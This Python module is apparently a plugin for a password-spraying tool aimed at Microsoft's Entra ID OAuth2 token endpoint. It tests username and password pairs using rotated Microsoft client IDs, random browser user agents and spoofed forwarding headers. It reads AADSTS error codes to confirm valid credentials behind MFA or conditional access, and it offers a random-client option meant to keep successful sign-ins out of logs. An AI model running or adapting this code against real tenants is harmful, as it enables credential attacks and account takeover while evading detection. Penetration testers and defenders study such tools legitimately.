import requests, random
import json
import os
import datetime
import uuid
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def extract_error(desc):

    return desc.split(":")[0].strip()
    

def msolv1_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.98",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383"
    ]
    
    # we will use one of the user agents from the list above as opposed to the one configured in the parent tool unless "use_agent" option configured
    if 'use_agent' in pluginargs and pluginargs['use_agent']:
        useragent = useragent
    else:
        useragent = random.choice(user_agents)


    client_ids = [
        "a40d7d7d-59aa-447e-a655-679a4107e548", # Accounts Control UI
        "be1918be-3fe3-4be9-b32b-b542fc27f02e", # M365 Compliance Drive Client
        "4813382a-8fa7-425e-ab75-3b753aab3abb", # Microsoft Authenticator App
        "04b07795-8ddb-461a-bbee-02f9e1bf7b46", # Microsoft Azure CLI
        "1950a258-227b-4e31-a9cf-717495945fc2", # Microsoft Azure PowerShell
        "cf36b471-5b44-428c-9ce7-313bf84528de", # Microsoft Bing Search
        "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", # Microsoft Bing Search for Microsoft Edge
        "cab96880-db5b-4e15-90a7-f3f1d62ffe39", # Microsoft Defender Platform
        "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3", # Microsoft Defender for Mobile
        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34", # Microsoft Edge
        "d7b530a4-7680-4c23-a8bf-c52c121d2e87", # Microsoft Edge Enterprise New Tab Page
        "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0", # Microsoft Flow
        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223", # Microsoft Intune Company Portal
        "d3590ed6-52b3-4102-aeff-aad2292ab01c", # Microsoft Office
        "66375f6b-983f-4c2c-9701-d680650f588f", # Microsoft Planner
        "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12", # Microsoft Power BI
        "844cca35-0656-46ce-b636-13f48b0eecbd", # Microsoft Stream Mobile Native
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264", # Microsoft Teams
        "87749df4-7ccf-48f8-aa87-704bad0e0e16", # Microsoft Teams - Device Admin Agent
        "22098786-6e16-43cc-a27d-191a01a1e3b5", # Microsoft To-Do client
        "eb539595-3fe1-474e-9c1d-feb3625d1be5", # Microsoft Tunnel
        "57336123-6e14-4acc-8dcf-287b6088aa28", # Microsoft Whiteboard Client
        "00b41c95-dab0-4487-9791-b9d2c32c80f2", # Office 365 Management
        "0ec893e0-5785-4de6-99da-4ed124e5296c", # Office UWP PWA
        "b26aadf8-566f-4478-926f-589f601d9c74", # OneDrive
        "ab9b8c07-8f02-4f72-87fa-80105867a763", # OneDrive SyncEngine
        "af124e86-4e96-495a-b70a-90f90ab96707", # OneDrive iOS App
        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", # Outlook Lite
        "27922004-5251-4030-b22d-91ecd9a37ea4", # Outlook Mobile
        "4e291c71-d680-4d0e-9640-0a3358e31177", # PowerApps
        "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", # SharePoint
        "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d", # SharePoint Android
        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", # Visual Studio
        "26a7ee05-5602-4d76-a7ba-eae8b7b67941", # Windows Search
        "a569458c-7f2b-45cb-bab9-b7dee514d112" # Yammer iPhone
    ]

    # option to use a random client_id for the login, generates a AADSTS700016 on successful cred validation, 
    # but wont give a token or generate a successful login event in logs    
    if 'random_client' in pluginargs:
        client_id = str(uuid.uuid4())
    else:
        client_id = random.choice(client_ids)


    body = {
        'resource': 'https://graph.microsoft.com',
        'client_id' : client_id,
        'client_info' : '1',
        'grant_type' : 'password',
        'username' : username,
        'password' : password,
        'scope' : 'openid',
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
        "User-Agent" : useragent,
        'Accept' : 'application/json',
        'Content-Type' : 'application/x-www-form-urlencoded'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    endpoint = 'common'
    if 'tenant_id' in pluginargs:
        endpoint = pluginargs['tenant_id']

    try:
        resp = requests.post(f"{url}/{endpoint}/oauth2/token", headers=headers, data=body)

        if resp.status_code == 200:
            data_response['result'] = "success"
            data_response['output'] = f"[+] SUCCESS: {username}:{password}"
            data_response['valid_user'] = True

            if 'response_log' in pluginargs:
                try: 
                    logdata = data_response.copy()
                    logdata['timestamp'] = str(datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None))
                    logdata['response'] = resp.text
                    logdata['spoofed_ip'] = spoofed_ip
                    logdata['user_agent'] = useragent
                    logdata['client_id'] = client_id
                    open(pluginargs['response_log'], 'a+').write(json.dumps(logdata) + os.linesep)
                except:
                    pass

        else:
            response = resp.json()
            error = response["error_description"]
            error_code = extract_error(error)

            if "AADSTS50126" in error:
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE ({error_code}): Invalid username or password. Username: {username} could exist"

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE ({error_code}): Error for {username}: {error}"

            elif "AADSTS50034" in error:
                data_response['result'] = "failure"
                data_response['output'] = f'[-] FAILURE ({error_code}): Error for {username}: {error}'

            elif "AADSTS53003" in error:
                # Access successful but blocked by CAP
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates token access is blocked by CAP"
                data_response['valid_user'] = True  

            elif "AADSTS50076" in error:
                # Microsoft MFA response
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
                data_response['valid_user'] = True

            elif "AADSTS50079" in error:
                # Microsoft MFA response
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!"
                data_response['valid_user'] = True

            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                data_response['valid_user'] = True

            elif "AADSTS53003" in error and not "AADSTS530034" in error:
                # Conditional Access response as per https://github.com/dafthack/MSOLSpray/issues/5
                data_response['result'] = "success"
                data_response['output'] =f"SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
                data_response['valid_user'] = True

            elif "AADSTS50053" in error:
                # Locked out account or Smart Lockout in place
                data_response['result'] = "potential"
                data_response['output'] = f"[?] WARNING ({error_code}): The account {username} appears to be locked."

            elif "AADSTS50055" in error:
                # User password is expired
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user's password is expired."
                data_response['valid_user'] = True

            elif "AADSTS50057" in error:
                # The user account is disabled
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user is disabled."
                data_response['valid_user'] = True

            elif "AADSTS65002" in error:
                # Preauthorization consent required for client_id
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: This will not result in a valid token response."
                data_response['valid_user'] = True

            elif "AADSTS700016" in error:
                # Application not installed - for client applications that are not known by the tenant, indicates successful login but not logged as such
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: This will not result in a valid token response."
                data_response['valid_user'] = True

            else:
                # Unknown errors
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE ({error_code}): Got an error we haven't seen yet for user {username}"
                

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
